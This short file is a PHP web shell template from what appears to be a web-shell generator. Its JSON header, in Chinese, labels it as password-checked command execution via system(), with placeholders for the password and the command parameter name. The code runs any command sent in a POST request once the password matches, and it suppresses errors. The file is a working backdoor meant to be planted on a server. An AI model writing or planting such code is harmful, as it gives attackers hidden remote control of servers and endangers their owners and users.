// MODULE = {"name": "php_basic", "desc": "PHP 命令执行:密码校验 + system(最常用)", "category": "php", "params": [["pass", "连接密码"], ["cmd_param", "命令参数名,默认 cmd"]]}
<?php
if (isset($_POST['{{cmd_param}}']) && isset($_POST['pass']) && $_POST['pass'] === '{{pass}}') {
    @system($_POST['{{cmd_param}}']);
}
?>
